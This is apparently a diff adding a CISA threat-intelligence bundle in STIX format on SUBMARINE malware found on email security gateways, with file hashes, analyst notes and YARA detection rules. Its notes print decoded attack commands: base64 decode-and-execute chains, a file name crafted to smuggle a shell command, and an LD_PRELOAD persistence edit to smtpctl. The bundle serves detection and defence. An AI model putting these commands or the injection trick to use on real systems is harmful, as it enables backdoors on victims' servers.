@@ -1,0 +1,450 @@
+{
+    "type": "bundle",
+    "id": "bundle--a35ffd3c-3626-4edb-91e7-21daca9fce7a",
+    "objects": [
+        {
+            "type": "identity",
+            "spec_version": "2.1",
+            "id": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created_by_ref": "identity--42ac3c92-60d2-418f-ba8e-838944e6110b",
+            "created": "2023-04-12T17:53:09.646Z",
+            "modified": "2023-04-12T17:53:09.646Z",
+            "name": "GeminiProduction_CMA",
+            "description": "Cybersecurity and Infrastructure Security Agency Production Identity. Code and Media Analysis.",
+            "identity_class": "system",
+            "confidence": 100,
+            "lang": "en",
+            "object_marking_refs": [
+                "marking-definition--bab4a63c-aed9-4cf5-a766-dfca5abac2bb"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--ad9136cf-ceed-5339-87b4-459fa22a51c7",
+            "hashes": {
+                "MD5": "d03e1f112f0c784a39003e0b3992ad80",
+                "SHA-1": "447369281ba26b7a6da4f659aa31026605aa3c6f",
+                "SHA-256": "2a353e9c250e5ea905fa59d33faeaaa197d17b4a4785456133aab5dbc1d1d5d5",
+                "SHA-512": "aead33a656f647d58da0a7f5240eb8cd7c0121c9ea33ae6504687b5faf21779e67b659a93987392033ea8ae2aae239e432444dcddad52f2a8665add7265902f6",
+                "SSDEEP": "96:CjXDCc0wSWbCZgFHwlJc8UpsmdpanoP5Mc8wWuMdHABIz2mN:CjXDN0wSWQp08UpsmFm4mhCm"
+            },
+            "size": 5465,
+            "name": "config.TRG",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--f9df024e-db1d-4943-a95c-a73ef46c37e1",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "config.TRG",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'config.TRG' is a SUBMARINE artifact. The presence of the filename, 'config.TRG' does not indicate that the ESG is infected. Instead, it is the actual contents of the file that determine whether it is infected or not. The contents of 'config.TRG' is contained within the SQL database file called 'config.snapshot' and the MIME attachments. Presence of the contents of the file 'config.TRG' within the SQL database is indicative of an infection of SUBMARINE.\r\n\r\nThe file contains a malicious SQL trigger called \u2018cuda_trigger\u2019 (Figure 1). This SQL trigger is set to run as root on the local host before a row is deleted from the database. After the trigger parameters are met, two actions occur. First a compressed, base64 encoded blob containing 2 files is written into a file called \u2018r\u2019 in the \u2018/var/tmp\u2019 directory (Figure 2). Second, a base64 encoded command is executed (Figure 3). \r\n\r\n--Begin Base64 Decoded Command--\r\ncat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp\r\nnohup bash /var/tmp/run.sh   <BSMTP_ID>   >/dev/null 2>&1 &\r\nrm -f /root/machine\\` *chmod +x /root/mac*\r\nsh /root/mach*\\`*\r\n--End Base64 Decoded Command--\r\n\r\nThe commands will decode the base64 encoded string and execute the decoded result as a shell command. The commands will pass the contents of the file 'r' to be decoded then decompressed with the 'tar' command. Then, the file 'run.sh' executes with the 'nohup' parameter. The 'nohup' parameter allows the process launched on the shell to continue executing even if the shell is closed. The 'BSMTP_ID' is passed and all errors redirected and discarded to the '/dev/null' directory. Lastly, the contents of the '/root/machine' directory will be removed, permissions are set to executable, and shell scripts containing a name with the string 'mach*' in the root directory are executed.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_06 rule_content=rule CISA_10454006_06 : SUBMARINE trojan backdoor cleans_traces_of_infection hides_artifacts installs_other_components\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-11\"\n\t\tLast_Modified = \"20230727_1200\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"cleans-traces-of-infection hides-artifacts installs-other-components\"\n\t\tMalware_Type = \"trojan backdoor\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects SUBMARINE SQL trigger samples\"\n\t\tSHA256_1 = \"2a353e9c250e5ea905fa59d33faeaaa197d17b4a4785456133aab5dbc1d1d5d5\"\n\tstrings:\n\t\t$s1 = { 54 52 49 47 47 45 52 }\n\t\t$s2 = { 43 52 45 41 54 45 }\n\t\t$s3 = { 53 45 4c 45 43 54 20 22 65 63 68 6f 20 2d 6e }\n\t\t$s4 = { 62 61 73 65 36 34 20 2d 64 20 7c 20 73 68 }\n\t\t$s5 = { 72 6f 6f 74 }\n\t\t$s6 = { 53 45 54 }\n\t\t$s7 = { 45 4e 44 20 49 46 3b }\n\t\t$s8 = { 48 34 73 49 41 41 41 41 41 41 41 41 41 2b 30 61 43 33 42 55 }\n\t\t$s9 = { 2f 76 61 72 2f 74 6d 70 2f 72 }\n\t\t$s10 = { 2f 72 6f 6f 74 2f 6d 61 63 68 69 6e 65 }\n\tcondition:\n\tfilesize < 250KB and all of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.674956Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--fa64925d-26d4-4437-8c74-9a0e4c468530",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'config.TRG' is a SUBMARINE artifact. The presence of the filename, 'config.TRG' does not indicate that the ESG is infected. Instead, it is the actual contents of the file that determine whether it is infected or not. The contents of 'config.TRG' is contained within the SQL database file called 'config.snapshot' and the MIME attachments. Presence of the contents of the file 'config.TRG' within the SQL database is indicative of an infection of SUBMARINE.\r\n\r\nThe file contains a malicious SQL trigger called \u2018cuda_trigger\u2019 (Figure 1). This SQL trigger is set to run as root on the local host before a row is deleted from the database. After the trigger parameters are met, two actions occur. First a compressed, base64 encoded blob containing 2 files is written into a file called \u2018r\u2019 in the \u2018/var/tmp\u2019 directory (Figure 2). Second, a base64 encoded command is executed (Figure 3). \r\n\r\n--Begin Base64 Decoded Command--\r\ncat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp\r\nnohup bash /var/tmp/run.sh   <BSMTP_ID>   >/dev/null 2>&1 &\r\nrm -f /root/machine\\` *chmod +x /root/mac*\r\nsh /root/mach*\\`*\r\n--End Base64 Decoded Command--\r\n\r\nThe commands will decode the base64 encoded string and execute the decoded result as a shell command. The commands will pass the contents of the file 'r' to be decoded then decompressed with the 'tar' command. Then, the file 'run.sh' executes with the 'nohup' parameter. The 'nohup' parameter allows the process launched on the shell to continue executing even if the shell is closed. The 'BSMTP_ID' is passed and all errors redirected and discarded to the '/dev/null' directory. Lastly, the contents of the '/root/machine' directory will be removed, permissions are set to executable, and shell scripts containing a name with the string 'mach*' in the root directory are executed.",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--ad9136cf-ceed-5339-87b4-459fa22a51c7"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--b811e25b-1e94-5de7-a99f-ff509bb7cf07",
+            "hashes": {
+                "MD5": "c5c93ba36e079892c1123fe9dffd660f",
+                "SHA-1": "e1df0da64a895ff00fc27a41898aa221b5b7d926",
+                "SHA-256": "8695945155d3a87a5733d31bf0f4c897e133381175e1a3cdc8c73d9e38640239",
+                "SHA-512": "a07e79b99e02fa52ab5ab75fc2d989d35d4b360a57fdf0ec5569f445fe1820d26915adbd4f30e3a9126e5cabcde9ca840779039393c39e5838618f06db47a4cc",
+                "SSDEEP": "3:jT81L9RUjD+rlczyX837QTa0NDO9Z8giofQHcQMHL6wF8ufIhW0TaT7ZsNvn:c1JRID+pc2XS7Ga0yYgC3GLX8Q0TaRsv"
+            },
+            "size": 202,
+            "name": "machineecho_-n_Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK___base64_-d__sh",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--f5d0acf7-6700-456c-97f1-ab1c3d01c08d",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "machineecho_-n_Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK___base64_-d__sh",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'machineecho -n Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK _ base64 -d _sh`_' is a SUBMARINE artifact. The file is a shell script identified in the '/root' directory and contains base64 encoded commands. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell.\r\n\r\n--Begin Base64 Decoded Name/Command--\r\nchmod +x /root/mac*\r\nsh /root/mach*\\`*\r\n--End Base64 Decoded Name/Command--\r\n\r\nThe above commands will change the permissions of the directory, '/root/mac*', to executable. \r\n\r\nThe file contains a series of operations, such as decoding a base64 encoded string and executing the decoded result as a shell command. The decoded base64 string represents a series of commands that will be executed by the shell. \r\n\r\n~Begin Base64 Decoded Command~\r\n\r\ncat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp\r\nnohup bash /var/tmp/run.sh   <REDACTED BSMTP_ID>    >/dev/null 2>&1 &\r\nrm -f /root/machine\\`*\r\n\r\n~End Base64 Decoded Command~\r\n\r\nThis command is identical to the decoded base64 commands found in the SQL trigger identified in the file 'config.snapshot'.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_07 rule_content=rule CISA_10454006_07 : SUBMARINE trojan dropper exploit_kit evades_av hides_executing_code hides_artifacts exploitation\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-11\"\n\t\tLast_Modified = \"20230711_1830\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"evades-av hides-executing-code hides-artifacts\"\n\t\tMalware_Type = \"trojan dropper exploit-kit\"\n\t\tTool_Type = \"exploitation\"\n\t\tDescription = \"Detects ESG FileName exploit samples\"\n\t\tSHA256 = \"8695945155d3a87a5733d31bf0f4c897e133381175e1a3cdc8c73d9e38640239\"\n\tstrings:\n\t\t$s1 = { 7c 20 62 61 73 65 36 34 20 2d 64 20 7c 20 73 68 }\n\t\t$s2 = { 65 63 68 6f 20 2d 6e }\n\t\t$s3 = { 59 32 46 30 49 43 39 32 59 58 49 76 64 47 31 77 4c 33 49 67 66 43 42 69 59 58 4e 6c 4e 6a 51 67 4c 57 51 67 4c 57 6b 67 66 43 42 30 59 58 49 67 }\n\tcondition:\n\t\tfilesize < 1KB and all of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.69222Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--70cba764-b7e8-4183-bded-455bdc844aae",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'machineecho -n Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK _ base64 -d _sh`_' is a SUBMARINE artifact. The file is a shell script identified in the '/root' directory and contains base64 encoded commands. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell.\r\n\r\n--Begin Base64 Decoded Name/Command--\r\nchmod +x /root/mac*\r\nsh /root/mach*\\`*\r\n--End Base64 Decoded Name/Command--\r\n\r\nThe above commands will change the permissions of the directory, '/root/mac*', to executable. \r\n\r\nThe file contains a series of operations, such as decoding a base64 encoded string and executing the decoded result as a shell command. The decoded base64 string represents a series of commands that will be executed by the shell. \r\n\r\n~Begin Base64 Decoded Command~\r\n\r\ncat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp\r\nnohup bash /var/tmp/run.sh   <REDACTED BSMTP_ID>    >/dev/null 2>&1 &\r\nrm -f /root/machine\\`*\r\n\r\n~End Base64 Decoded Command~\r\n\r\nThis command is identical to the decoded base64 commands found in the SQL trigger identified in the file 'config.snapshot'.",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--b811e25b-1e94-5de7-a99f-ff509bb7cf07"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--1f40b2e4-ef40-5ea5-b24f-d20dda72c833",
+            "hashes": {
+                "MD5": "03e07c538a5e0e7906af803a83c97a1e",
+                "SHA-1": "600452b1cff8d99e41093be8b68f62e7c85f23d7",
+                "SHA-256": "6dd8de093e391da96070a978209ebdf9d807e05c89dba13971be5aea2e1251d0",
+                "SHA-512": "a4a6257dd6f859ae58de3b46879926ce99e3e3edb16db37dc80da4975f5a2866f4cd722233b98c9553e319e61661cae98d535ccb26d8c9709cf6f2efa56b9b3f",
+                "SSDEEP": "96:pjXDCc0wSWbCZgFHwlJc8UpsmdpanoP5Mc8wWuMdHABIZ:pjXDN0wSWQp08UpsmFm4mhCC"
+            },
+            "size": 4857,
+            "name": "r",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--4a50e72e-c50a-49c2-9dfe-7269d81206a9",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "r",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'r' is a SUBMARINE artifact. The file is a Base64 encoded GNU Zip (GZIP) archive. When the 'cat /*/*/r | base64 -d -i | tar -zx -C /*/*' Linux Shell command is applied to 'r', it decompresses two files. The aforementioned Linux Shell command is contained in 'config.snapshot' as a Base64 encoded SQL trigger.\r\n\r\n--Begin Decompressed Files--\r\n1. run.sh (bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a)\r\n2. libutil.so (81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab)\r\n--End Decompressed Files--",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_02 rule_content=rule CISA_10454006_02 : SUBMARINE trojan backdoor exploitation hides_artifacts prevents_artifact_access\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-06-29\"\n\t\tLast_Modified = \"20230711_1500\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"hides-artifacts prevents-artifact-access\"\n\t\tMalware_Type = \"trojan backdoor\"\n\t\tTool_Type = \"exploitation\"\n\t\tDescription = \"Detects encoded GZIP archive samples\"\n\t\tSHA256_1 = \"6dd8de093e391da96070a978209ebdf9d807e05c89dba13971be5aea2e1251d0\"\n\tstrings:\n\t\t$s1 = { 48 34 73 49 41 41 41 41 41 41 41 41 41 2b 30 61 }\n\t\t$s2 = { 44 44 44 41 67 50 39 2f 2b 43 38 47 70 2f 36 63 41 46 41 41 41 41 3d 3d 0a}\n\t\t$s3 = { 37 56 4d 70 56 58 4f 37 2b 6d 4c 39 78 2b 50 59 }\n\tcondition:\n\t\tfilesize < 6KB and 3 of them and (math.entropy(0,filesize) > 5.8)\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.709825Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--e4045a09-39aa-4a8b-8af5-57bcd41a08df",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'r' is a SUBMARINE artifact. The file is a Base64 encoded GNU Zip (GZIP) archive. When the 'cat /*/*/r | base64 -d -i | tar -zx -C /*/*' Linux Shell command is applied to 'r', it decompresses two files. The aforementioned Linux Shell command is contained in 'config.snapshot' as a Base64 encoded SQL trigger.\r\n\r\n--Begin Decompressed Files--\r\n1. run.sh (bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a)\r\n2. libutil.so (81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab)\r\n--End Decompressed Files--",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--1f40b2e4-ef40-5ea5-b24f-d20dda72c833"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--25910ba1-5215-55ac-933c-5d78f50d0dd6",
+            "hashes": {
+                "MD5": "c2e577c71d591999ad5c581e49343093",
+                "SHA-1": "d446e06e40053214788aa1bad17b6d3587a2a370",
+                "SHA-256": "bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a",
+                "SHA-512": "ffe528fcb448424b1f811a4b9068402971bf2705ad64e556071a062cd89d74d371d3ef41afca38450b7d8457611246a6ba35478dfc83e997950d2f85c8dac80f",
+                "SSDEEP": "12:avOAsp2yBXGTVjnJAIFw/J7G80ZWkbUErPzg:azsphBXSFZFwgLWkXg"
+            },
+            "size": 473,
+            "name": "run.sh",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--168a661e-ebd2-4d1e-b9b2-1030b8f70d4d",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "run.sh",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'run.sh' is a SUBMARINE loader. The file is a shell script located at within the archive 'r' in the '/var/tmp' directory. The purpose of 'run.sh' is to perform a combination of file manipulation, script generation and execution (Figure 4). There are 4 variables within 'run.sh':\r\n\r\n--Begin Variable List--\r\n\r\nB1=$1\r\nF=\"/boot/os_tools/hw-set\"\r\nS=\"/home/product/code/firmware/current/sbin/smtpctl\"\r\nA=\"/boot/os_tools/libutil.so\"\r\nB=`echo -n \"sed -i \\\"s|exec|BSMTP_ID=$B1 LD_PRELOAD=$A exec|g\\\" $S\"|base64 -w0`\r\n\r\n--End Variable List--\r\n\r\nThe script begins by moving SUBMARINE from the '/var/tmp/' directory to the '/boot/os_tools/' directory for persistence. \r\n\r\nThe variable \"B\" is declared as a 'sed' command that replaces all occurrences of the string 'exec' with `BSMTP_ID=$1 LD_PRELOAD=/boot/os_tools/libutil.so exec /home/product/code/firmware/current/sbin/smtpctl'. This 'sed' command is then base64 encoded.\r\n\r\nA new file called 'hw-set' is created in the '/boot/os_tools/' directory. A line is appended to the 'smtpctl' file which checks for the string 'LD_PRELOAD'. If the string is not found, the base64 encoded string stored in variable \"B\" is decoded and executed as a shell command and 'smtpctl' is restarted. \r\n\r\nThe 'chmod' command is used to set executable permissions for 'hw-set'.\r\n\r\nThe 'sed' command is used with a '-i' flag to modify the file 'update_version' within the '/boot/os_tools/' directory with an appended string to line 44. The appended string, \"system('/boot/os_tools/hw-set 2>&1 >/dev/null &');\", will run the file 'hw-set' in the background and redirect both output and errors to 'dev/null' whenever the file 'update_version' is executed.\r\n\r\nThe file 'hw-set' is executed and the 'sed' command with the '-i' flag is used to insert the string 'sleep 2m' on line 1 to set a sleep duration of 2 minutes. \r\n\r\nFinally, all files and directories within '/var/tmp/' directory are removed.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_03 rule_content=rule CISA_10454006_03 : SUBMARINE trojan backdoor loader rootkit virus controls_local_machine hides_artifacts infects_files installs_other_components remote_access exploitation information_gathering\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-03\"\n\t\tLast_Modified = \"20230711_1500\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"controls-local-machine hides-artifacts infects-files installs-other-components\"\n\t\tMalware_Type = \"trojan backdoor loader rootkit virus\"\n\t\tTool_Type = \"remote-access exploitation information-gathering\"\n\t\tDescription = \"Detects SUBMARINE launcher script samples\"\n\t\tSHA256_1 = \"bbbae0455f8c98cc955487125a791052353456c8f652ddee14f452415c0b235a\"\n\tstrings:\n\t\t$s1 = { 73 65 64 20 2d 69 }\n\t\t$s2 = { 4c 44 5f 50 52 45 4c 4f 41 44 3d }\n\t\t$s3 = { 6c 69 62 75 74 69 6c 2e 73 6f }\n\t\t$s4 = { 2f 73 62 69 6e 2f 73 6d 74 70 63 74 6c }\n\t\t$s5 = { 2f 62 6f 6f 74 2f 6f 73 5f 74 6f 6f 6c 73 }\n\t\t$s6 = { 72 6d 20 2d 72 66 }\n\t\t$s7 = { 62 61 73 65 36 34 20 2d 64 }\n\t\t$s8 = { 7c 73 68 }\n\t\t$s9 = { 72 65 73 74 61 72 74 }\n\t\t$s10 = { 2f 64 65 76 2f 6e 75 6c 6c }\n\t\t$s11 = { 23 21 20 2f 62 69 6e 2f 73 68 }\n\t\t$s12 = { 62 61 73 65 36 34 }\n\tcondition:\n\t\tfilesize < 2KB and all of them\n}\n 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_04 rule_content=rule CISA_10454006_04 : SUBMARINE trojan backdoor hides_artifacts hides_executing_code infects_files installs_other_components remote_access exploitation\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230711_1500\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"hides-artifacts hides-executing-code infects-files installs-other-components\"\n\t\tMalware_Type = \"trojan backdoor\"\n\t\tTool_Type = \"remote-access exploitation\"\n\t\tDescription = \"Detects SUBMARINE launcher script samples\"\n\t\tSHA256_1 = \"b98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43\"\n\tstrings:\n\t\t$s1 = { 73 6c 65 65 70 }\n\t\t$s2 = { 7c 62 61 73 65 36 34 20 2d 64 }\n\t\t$s3 = { 4c 44 5f 50 52 45 4c 4f 41 44 }\n\t\t$s4 = { 2f 68 6f 6d 65 2f 70 72 6f 64 75 63 74 2f 63 6f 64 65 2f 66 69 72 6d 77 61 72 65 2f 63 75 72 72 65 6e 74 2f 73 62 69 6e 2f 73 6d 74 70 63 74 6c 20 72 65 73 74 61 72 74 }\n\t\t$s5 = { 65 63 68 6f 20 2d 6e 20 27 }\n\t\t$s6 = { 73 68 }\n\t\t$s7 = { 23 21 20 2f 62 69 6e 2f 73 68 }\n\tcondition:\n\t\tfilesize < 2KB and 6 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.729096Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--94938b65-d053-4a05-bb38-605abd8f11a5",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'run.sh' is a SUBMARINE loader. The file is a shell script located at within the archive 'r' in the '/var/tmp' directory. The purpose of 'run.sh' is to perform a combination of file manipulation, script generation and execution (Figure 4). There are 4 variables within 'run.sh':\r\n\r\n--Begin Variable List--\r\n\r\nB1=$1\r\nF=\"/boot/os_tools/hw-set\"\r\nS=\"/home/product/code/firmware/current/sbin/smtpctl\"\r\nA=\"/boot/os_tools/libutil.so\"\r\nB=`echo -n \"sed -i \\\"s|exec|BSMTP_ID=$B1 LD_PRELOAD=$A exec|g\\\" $S\"|base64 -w0`\r\n\r\n--End Variable List--\r\n\r\nThe script begins by moving SUBMARINE from the '/var/tmp/' directory to the '/boot/os_tools/' directory for persistence. \r\n\r\nThe variable \"B\" is declared as a 'sed' command that replaces all occurrences of the string 'exec' with `BSMTP_ID=$1 LD_PRELOAD=/boot/os_tools/libutil.so exec /home/product/code/firmware/current/sbin/smtpctl'. This 'sed' command is then base64 encoded.\r\n\r\nA new file called 'hw-set' is created in the '/boot/os_tools/' directory. A line is appended to the 'smtpctl' file which checks for the string 'LD_PRELOAD'. If the string is not found, the base64 encoded string stored in variable \"B\" is decoded and executed as a shell command and 'smtpctl' is restarted. \r\n\r\nThe 'chmod' command is used to set executable permissions for 'hw-set'.\r\n\r\nThe 'sed' command is used with a '-i' flag to modify the file 'update_version' within the '/boot/os_tools/' directory with an appended string to line 44. The appended string, \"system('/boot/os_tools/hw-set 2>&1 >/dev/null &');\", will run the file 'hw-set' in the background and redirect both output and errors to 'dev/null' whenever the file 'update_version' is executed.\r\n\r\nThe file 'hw-set' is executed and the 'sed' command with the '-i' flag is used to insert the string 'sleep 2m' on line 1 to set a sleep duration of 2 minutes. \r\n\r\nFinally, all files and directories within '/var/tmp/' directory are removed.",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--25910ba1-5215-55ac-933c-5d78f50d0dd6"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--149c0c97-1a85-56ae-8418-4eab1ee2069e",
+            "hashes": {
+                "MD5": "b860198feca7398bc79a8ec69afc65ed",
+                "SHA-1": "c4c64da81995044ea3447b8ffd07689382b7487b",
+                "SHA-256": "b98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43",
+                "SHA-512": "0d4b66dbeb88e8c9fb970572c033ab84b8273734277edb139cdc04560a0547d192a6762fc8ed8138eb43f7d05df6c36aa6bc1987eda4a4b6075e9059e71ef358",
+                "SSDEEP": "6:JkKgPxJooRKGKBNvd/UntDEcQwj7bPfNcgUBZqcL0FcXfFtC2i+RKGKBNvSv:alZJoospwtIclTNcRDnv7CJ+spSv"
+            },
+            "size": 341,
+            "name": "sedO4CWZ9",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--1c436118-98e8-4ff0-af4b-0dc0ff9e8b94",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "sedO4CWZ9",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'hw-set' is a SUBMARINE artifact. The file is a shell script located in the '/boot/os_tools/' directory and contains shell commands as well as a base64 encoded string (Figure 5). The shell script is set to sleep for 2 minutes prior to execution. The 'grep' command checks if the string 'LD_PRELOAD' is contained within the 'smtpctl' file located at '/home/product/code/firmware/current/sbin/'. The exclamation point (!) prepending the script is used to check for success or failure of the 'grep' command. If the string 'LD_PRELOAD' is not identified, a base64 encoded 'sed' command is used to modify the 'smtpctl' file (Figure 6).",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_04 rule_content=rule CISA_10454006_04 : SUBMARINE trojan backdoor hides_artifacts hides_executing_code infects_files installs_other_components remote_access exploitation\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230711_1500\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"hides-artifacts hides-executing-code infects-files installs-other-components\"\n\t\tMalware_Type = \"trojan backdoor\"\n\t\tTool_Type = \"remote-access exploitation\"\n\t\tDescription = \"Detects SUBMARINE launcher script samples\"\n\t\tSHA256_1 = \"b98f8989e8706380f779bfd464f3dea87c122651a7a6d06a994d9a4758e12e43\"\n\tstrings:\n\t\t$s1 = { 73 6c 65 65 70 }\n\t\t$s2 = { 7c 62 61 73 65 36 34 20 2d 64 }\n\t\t$s3 = { 4c 44 5f 50 52 45 4c 4f 41 44 }\n\t\t$s4 = { 2f 68 6f 6d 65 2f 70 72 6f 64 75 63 74 2f 63 6f 64 65 2f 66 69 72 6d 77 61 72 65 2f 63 75 72 72 65 6e 74 2f 73 62 69 6e 2f 73 6d 74 70 63 74 6c 20 72 65 73 74 61 72 74 }\n\t\t$s5 = { 65 63 68 6f 20 2d 6e 20 27 }\n\t\t$s6 = { 73 68 }\n\t\t$s7 = { 23 21 20 2f 62 69 6e 2f 73 68 